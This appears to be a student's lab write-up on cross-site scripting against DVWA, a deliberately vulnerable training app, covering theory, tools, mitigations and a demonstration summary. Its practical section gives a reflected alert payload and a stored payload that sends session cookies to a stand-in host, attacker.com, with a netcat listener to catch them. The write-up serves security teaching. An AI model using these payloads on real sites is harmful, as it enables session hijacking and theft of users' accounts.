# Cross-Site Scripting (XSS)

## Objective
To identify and exploit XSS vulnerabilities to execute malicious JavaScript in a victim's browser, and to implement effective mitigation strategies.

## Theory & Concepts
- **Stored XSS**: The malicious script is permanently stored on the target server (e.g., in a database, in a comment field).
- **Reflected XSS**: The malicious script is "reflected" off a web application to the victim's browser (e.g., via a URL parameter).
- **DOM-based XSS**: The vulnerability exists in client-side code rather than server-side code.
- **Mitigation**: Input sanitization, output encoding, and Content Security Policy (CSP).

## Tools Used
- DVWA
- Browser Developer Tools
- Burp Suite

## Commands & Practical Steps
- **Reflected XSS Payload**:
  - URL: `http://192.168.56.101/dvwa/vulnerabilities/xss_r/?name=<script>alert('XSS')</script>`
- **Stored XSS Payload**:
  - Input into Guestbook: `<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>`
- **Cookie Stealing**:
  - Use a basic netcat listener on the attacker machine to catch the cookie: `nc -lvp 80`.

## Practical Demonstration Summary
Demonstrated Reflected XSS by injecting a script into a search field that displayed an alert box. Executed a Stored XSS attack on a guestbook page to hijack user sessions by capturing session cookies.
